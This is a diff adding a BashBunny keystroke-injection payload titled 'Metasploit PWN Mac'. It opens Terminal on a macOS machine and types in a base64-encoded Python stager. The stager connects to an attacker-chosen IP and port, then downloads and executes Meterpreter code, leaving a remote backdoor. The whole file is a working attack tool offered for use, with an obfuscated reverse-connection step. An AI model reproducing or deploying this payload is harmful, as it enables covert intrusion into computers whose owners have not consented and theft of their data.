@@ -1,0 +1,50 @@
+#!/bin/bash
+#
+# Title:         Metasploit PWN Mac
+# Author:        kmakblob
+# Version:       1.0
+#
+# Opens up a terminal and sets up a backdoor (meterpeter)
+# the receiving IP can either be the BashBunny's or a custom one
+#
+# Red................GNU Base64 is not installed on the Bunny! Go do that!
+# Green..............Finished
+#
+
+
+customphonehome=0
+customphonehomeip="If you are not using the BashBunny (ssh) as your receiver then put an ip for one here"
+MSFPORT="Place the port you would like to listen on here"
+source bunny_helpers.sh
+
+
+if ["$customphonehome" = 0]
+then MSFIP=$HOST_IP
+elif ["$customphonehome" = 1]
+then MSFIP=$customphonehomeip
+fi
+
+command -v base64 >/dev/null 2>&1 || { LED R }
+
+
+encoded=$(printf "%s\n" "import socket,struct" "s=socket.socket(2,socket.SOCK_STREAM)" "s.connect(('$MSFIP',$MSFPORT))" "l=struct.unpack('>I',s.recv(4))[0]" "d=s.recv(l)" "while len(d)<l:" "    d+=s.recv(l-len(d))" "exec(d,{'s':s})" | base64)
+
+QUACK GUI SPACE
+QUACK DELAY 1000
+QUACK STRING terminal
+QUACK ENTER
+QUACK DELAY 8000
+QUACK STRING python
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('$encoded')))
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING exit()
+QUACK DELAY 500
+QUACK ENTER
+QUACK DELAY 500
+QUACK GUI q
+
+LED G
